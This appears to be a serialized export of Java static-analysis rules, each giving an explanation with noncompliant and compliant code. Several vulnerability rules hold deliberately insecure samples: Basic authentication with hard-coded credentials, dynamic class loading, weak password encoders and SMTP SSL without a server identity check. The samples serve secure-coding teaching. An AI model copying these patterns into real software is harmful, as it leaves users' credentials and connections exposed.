  Misconfiguration </li>
</ul>ZVULNERABILITY
≥

java:S1452§
javaS1452>Generic wildcard types should not be used in return parameters"CRITICAL*java:∏<p>It is highly recommended <strong>not</strong> to use wildcard types as return types. Because the type inference rules are fairly complex it is
unlikely the user of that API will know how to use it correctly. </p>
<p>Let's take the example of method returning a "List&lt;? extends Animal&gt;". Is it possible on this list to add a Dog, a Cat, ... we simply don't
know. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard types should be limited to method
parameters.</p>
<p>This rule raises an issue when a method returns a wildcard type. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;? extends Animal&gt; getAnimals(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;Animal&gt; getAnimals(){...}
</pre>
<p>or</p>
<pre>
List&lt;Dog&gt; getAnimals(){...}
</pre>Z
CODE_SMELL
©

java:S3518ö
javaS3518)Zero should not be a possible denominator"CRITICAL*java: <p>If the denominator to a division or modulo operation is zero it would result in a fatal error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
  }
  z = 1 / z; // Noncompliant, possible division by zero
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void test_divide() {
  int z = 0;
  if (unknown()) {
    // ..
    z = 3;
  } else {
    // ..
    z = 1;
  }
  z = 1 / z;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/369.html">MITRE, CWE-369</a> - Divide by zero </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KAGyAw">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not
  result in divide-by-zero errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/cAI">CERT, INT33-C.</a> - Ensure that division and remainder operations do not result
  in divide-by-zero errors </li>
</ul>ZBUG
ü


java:S4605ê

javaS46055Spring beans should be considered by "@ComponentScan""CRITICAL*java:≠	<p>Spring beans belonging to packages that are not included in a <code>@ComponentScan</code> configuration will not be accessible in the Spring
Application Context. Therefore, it's likely to be a configuration mistake that will be detected by this rule. <strong>Note:</strong> the
<code>@ComponentScan</code> is implicit in the <code>@SpringBootApplication</code> annotation, case in which Spring Boot will auto scan for components
in the package containing the Spring Boot main class and its sub-packages.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Configuration
@ComponentScan("com.mycompany.app.beans")
public class Application {
...
}

package com.mycompany.app.web;

@Controller
public class MyController { // Noncompliant; MyController belong to "com.mycompany.app.web" while the ComponentScan is looking for beans in "com.mycompany.app.beans" package
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Configuration
@ComponentScan({"com.mycompany.app.beans","com.mycompany.app.web"})
public class Application {
...
}

package com.mycompany.app.web;

@Controller
public class MyController { // Compliant; "com.mycompany.app.web" is referenced by a @ComponentScan annotated class
...
}
</pre>Z
CODE_SMELL
ú

java:S1215ç
javaS1215FExecution of the Garbage Collector should be triggered only by the JVM"CRITICAL*java:ô<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what
will be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>
<ul>
  <li> Will the whole application be frozen during the call? </li>
  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>
  <li> Will the JVM simply ignore the call? </li>
  <li> ... </li>
</ul>
<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector should
be left exclusively to the JVM.</p>Z
CODE_SMELL
ı

java:S1699Ê
javaS16995Constructors should only call non-overridable methods"CRITICAL*java:É<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the
method.</p>
<p>For example:</p>
<ul>
  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>
  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>
  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a
  <code>NullPointerException</code>) can result, because the fields aren't initialized yet. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  public Parent () {
    doSomething();  // Noncompliant
  }

  public void doSomething () {  // not final; can be overridden
    ...
  }
}

public class Child extends Parent {

  private String foo;

  public Child(String foo) {
    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized
    this.foo = foo;
  }

  public void doSomething () {
    System.out.println(this.foo.length());
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/MYYbAQ">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/TQBi">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or
  destructors </li>
</ul>Z
CODE_SMELL
ò

java:S3972â
javaS3972&Conditionals should start on new lines"CRITICAL*java:µ<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as
maintainers fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>Z
CODE_SMELL
È

java:S1311⁄
javaS1311!Classes should not be too complex"CRITICAL*java:ã<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>,
<code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>,
<code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance
initializer in the class. The last return statement in method, if exists, is not taken into account.</p>
<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the
time, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several
classes.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
∑

java:S3973®
javaS3973EA conditionally executed single line should be denoted by indentation"CRITICAL*java:µ<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>Z
CODE_SMELL
∏

java:S2647©
javaS2647'Basic authentication should not be used"CRITICAL*java:—
<p>Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Using HttpPost from Apache HttpClient
String encoding = Base64Encoder.encode ("login:passwd");
org.apache.http.client.methods.HttpPost httppost = new HttpPost(url);
httppost.setHeader("Authorization", "Basic " + encoding);  // Noncompliant

or

// Using HttpURLConnection
String encoding = Base64.getEncoder().encodeToString(("login:passwd").getBytes(‚Äå"UTF‚Äå‚Äã-8"‚Äã));
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.setRequestProperty("Authorization", "Basic " + encoding); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Basic_Authentication">OWASP Basic Authentication</a> </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/522">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
º

java:S2653≠
javaS26530Web applications should not have a "main" method"CRITICAL*java:Ã
<p>There is no reason to have a <code>main</code> method in a web application. It may have been useful for debugging during application development,
but such a method should never make it into production. Having a <code>main</code> method in a web application opens a door to the application logic
that an attacker may never be able to reach (but watch out if one does!), but it is a sloppy practice and indicates that other problems may be
present.</p>
<p>This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
    if (userIsAuthorized(req)) {
      updatePrices(req);
    }
  }

  public static void main(String[] args) { // Noncompliant
    updatePrices(req);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VoB8Bw">CERT, ENV06-J.</a> - Production code must not contain debugging entry points
  </li>
</ul>ZVULNERABILITY
Ω

java:S3749Æ
javaS3749/Members of Spring components should be injected"CRITICAL*java:Œ<p>Spring <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default, meaning only one instance
of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members, such as a logger, but all
non-<code>static</code> members should be managed by Spring. That is, they should have one of these annotations: <code>@Resource</code>,
<code>@Inject</code>, <code>@Autowired</code> or <code>@Value</code>.</p>
<p>Having non-injected members in one of these classes could indicate an attempt to manage state. Because they are singletons, such an attempt is
almost guaranteed to eventually expose data from User1's session to User2. </p>
<p>This rule raises an issue when a singleton <code>@Controller</code>, <code>@Service</code>, or <code>@Repository</code> has non-<code>static</code>
members that are not annotated with one of:</p>
<ul>
  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>
  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>
  <li> <code>javax.annotation.Inject</code> </li>
  <li> <code>javax.annotation.Resource</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
public class HelloWorld {

  private String name = null;

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    if (greetee != null) {
      this.name = greetee;
    }

    return "Hello " + this.name;  // if greetee is null, you see the previous user's data
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
</ul>ZVULNERABILITY
¯

java:S2658È
javaS2658(Classes should not be loaded dynamically"CRITICAL*java:ê<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn't even have to instantiate or
explicitly invoke methods on such classes to be vulnerable to an attack.</p>
<p>This rule raises an issue for each use of dynamic class loading.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String className = System.getProperty("messageClassName");
Class clazz = Class.forName(className);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/470.html">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
</ul>ZVULNERABILITY
Û

java:S1948‰
javaS1948KFields in a "Serializable" class should either be transient or serializable"CRITICAL*java:Î<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is
never explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks flush objects to disk, and an allegedly
<code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers. In
general a <code>Serializable</code> class is expected to fulfil its contract and not have an unexpected behaviour when an instance is serialized. </p>
<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they
could be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the
class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;  // Noncompliant; Address isn't serializable
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Address implements Serializable {
  private static final long serialVersionUID = 2405172041950251807L;
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;
}
</pre>
<h2>Exceptions</h2>
<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the
responsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>
<pre>
 private void writeObject(java.io.ObjectOutputStream out)
     throws IOException
 private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/594.html">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk </li>
  <li> <a href="https://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html">Oracle Java 6, Serializable</a> </li>
  <li> <a href="https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html">Oracle Java 7, Serializable</a> </li>
</ul>Z
CODE_SMELL
Â

java:S1821÷
javaS1821("switch" statements should not be nested"CRITICAL*java:Ä<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo(int n, int m) {
  switch (n) {
    case 0:
      switch (m) {  // Noncompliant; nested switch
        // ...
      }
    case 1:
      // ...
    default:
      // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo(int n, int m) {
  switch (n) {
    case 0:
      bar(m);
    case 1:
      // ...
    default:
      // ...
  }
}

void bar(int m){
  switch(m) {
    // ...
  }
}
</pre>Z
CODE_SMELL
Å

java:S2701Ú
javaS27017Literal boolean values should not be used in assertions"CRITICAL*java:ç<p>There's no reason to use literal boolean values in assertions. Doing so is at best confusing for maintainers, and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Assert.assertTrue(true);  // Noncompliant
assertThat(true).isTrue(); // Noncompliant
</pre>Z
CODE_SMELL
‚	

java:S1609”	
javaS1609X@FunctionalInterface annotation should be used to flag Single Abstract Method interfaces"CRITICAL*java:Õ<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as
<code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and
<code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or
Method references. </p>
<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would
break the use of Lambda implementations.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
¯
	java:S131Í
javaS1311"switch" statements should have "default" clauses"CRITICAL*java:å<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,
then no <code>default</code> clause is expected.</p>
<p>Example:</p>
<pre>
public enum Day {
    SUNDAY, MONDAY
}
...
switch(day) {
  case SUNDAY:
    doSomething();
    break;
  case MONDAY:
    doSomethingElse();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
€
	java:S134Õ
javaS134`Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply"CRITICAL*java:¿<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
if (condition1) {                  // Compliant - depth = 1
  /* ... */
  if (condition2) {                // Compliant - depth = 2
    /* ... */
    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
      /* ... */
      if (condition4) {            // Noncompliant - depth = 4
        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          /* ... */
        }
        return;
      }
    }
  }
}
</pre>Z
CODE_SMELL
‘	
	java:S126∆	
javaS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*java:ﬂ<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw new IllegalStateException();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
©

java:S2186ö
javaS21864JUnit assertions should not be used in "run" methods"CRITICAL*java:∏<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in
<code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the
test won't fail.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void run() {
  // ...
  Assert.assertEquals(expected, actual);  // Noncompliant
}
</pre>Z
CODE_SMELL
√

java:S2063¥
javaS2063$Comparators should be "Serializable""CRITICAL*java:‚<p>A non-serializable <code>Comparator</code> can prevent an otherwise-<code>Serializable</code> ordered collection from being serializable. Since the
overhead to make a <code>Comparator</code> serializable is usually low, doing so can be considered good defensive programming.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt; {  // Noncompliant
  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt;, Serializable {
  private static final long serialVersionUID = 1;

  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>Z
CODE_SMELL
è

java:S2062Ä
javaS2062+"readResolve" methods should be inheritable"CRITICAL*java:ß<p>The <code>readResolve()</code> method allows final tweaks to the state of an object during deserialization. Non-final classes which implement
<code>readResolve()</code>, should not set its visibility to <code>private</code> since it will then be unavailable to child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  private Object readResolve() throws ObjectStreamException  // Noncompliant
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {  // No access to parent's readResolve() method
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  protected Object readResolve() throws ObjectStreamException
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {
  //...
}
</pre>Z
CODE_SMELL
î$

java:S5344Ö$
javaS5344<Authentication should not rely on insecure "PasswordEncoder""CRITICAL*java:ò#<p>Storing users' passwords in clear-text in a database is definitely not safe as hackers may have read access to all user accounts stored in the
database. It's common then to hash passwords and only store these hashes in the database. When running the authentication process, the hash of the
password provided by the user is compared to the hash stored in the database. If both matches, the access is granted. </p>
<p>This looks like a perfect solution but some algorithms such as MD5 and its successor, SHA-1, are no longer considered secure, because it is too
easy to create hash collisions with them.</p>
<p>That is, it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new,
same-hash value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest
algorithms: MD2, MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>For this reason, when <code>PasswordEncoder</code> is used to authenticate user in a Spring application, it should use a secure algorithm. The
following algorithms are considered not safe and should not be used:</p>
<ul>
  <li> <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.scrypt.SCryptPasswordEncoder</code> (Spring Security 5.0.x) </li>
</ul>
<p>Consider using safer alternatives, such as <code>org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder</code> (preferred) or
<code>org.springframework.security.crypto.password.Pbkdf2PasswordEncoder</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
        auth.jdbcAuthentication()
                .dataSource(dataSource)
                .usersByUsernameQuery("SELECT * FROM users WHERE username = ?")
                .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
        // OR
        auth.jdbcAuthentication()
                .dataSource(dataSource)
                .usersByUsernameQuery("SELECT * FROM users WHERE username = ?"); // Noncompliant; default uses plain-text
        // OR
        auth.userDetailsService(...); // Noncompliant; default uses plain-text
        // OR
        auth.userDetailsService(...).passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
    }
</pre>
<h2>Compliant Solution</h2>
<pre>
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
        auth.jdbcAuthentication()
                .dataSource(dataSource)
                .usersByUsernameQuery("Select * from users where username=?")
                .passwordEncoder(new BCryptPasswordEncoder());
        // or
        auth.userDetailsService(null).passwordEncoder(new BCryptPasswordEncoder());
    }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> https://blog.ircmaxell.com/2014/03/why-i-dont-recommend-scrypt.html </li>
</ul>ZVULNERABILITY
á
	java:S121˘
javaS121*Control structures should use curly braces"CRITICAL*java:¢<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
‹

java:S2197Õ
javaS21979Modulus results should not be checked for direct equality"CRITICAL*java:Ê<p>When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for
equality with a positive number (or a negative one) could result in unexpected results. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 != 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/xAHAAQ">CERT, NUM51-J.</a> - Do not assume that the remainder operator always returns a
  nonnegative result for integral operands </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NQBi">CERT, INT10-C</a> - Do not assume a positive remainder when using the % operator
  </li>
</ul>Z
CODE_SMELL
È

java:S4499⁄
javaS44990SMTP SSL connection should check server identity"CRITICAL*java:˘<p>This rule raises an issue when:</p>
<p>- a JavaMail's <code>javax.mail.Session</code> is created with a <code>Properties</code> object having no
<code>mail.smtp.ssl.checkserveridentity</code> or <code>mail.smtps.ssl.checkserveridentity</code> not configured to <code>true</code></p>
<p>- a Apache Common Emails's <code>org.apache.commons.mail.SimpleEmail</code> is used with <code>setSSLOnConnect(true)</code> or
<code>setStartTLSEnabled(true)</code> or <code>setStartTLSRequired(true)</code> without a call to <code>setSSLCheckServerIdentity(true)</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before sending the email
email.send();
</pre>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory"); // Noncompliant; Session is created without having "mail.smtp.ssl.checkserveridentity" set to true
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>Compliant Solution</h2>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true);
email.setSSLCheckServerIdentity(true); // Compliant
email.send();
</pre>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
props.put("mail.smtp.ssl.checkserveridentity", true); // Compliant
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/297.html">CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li>
</ul>ZVULNERABILITY
Ù
	java:S115Ê
javaS1155Constant names should comply with a naming convention"CRITICAL*java:Ñ<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public class MyClass {
  public static final int first = 1;
}

public enum MyEnum {
  first;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public static final int FIRST = 1;
}

public enum MyEnum {
  FIRST;
}
</pre>Z
CODE_SMELL
ò

java:S2070â
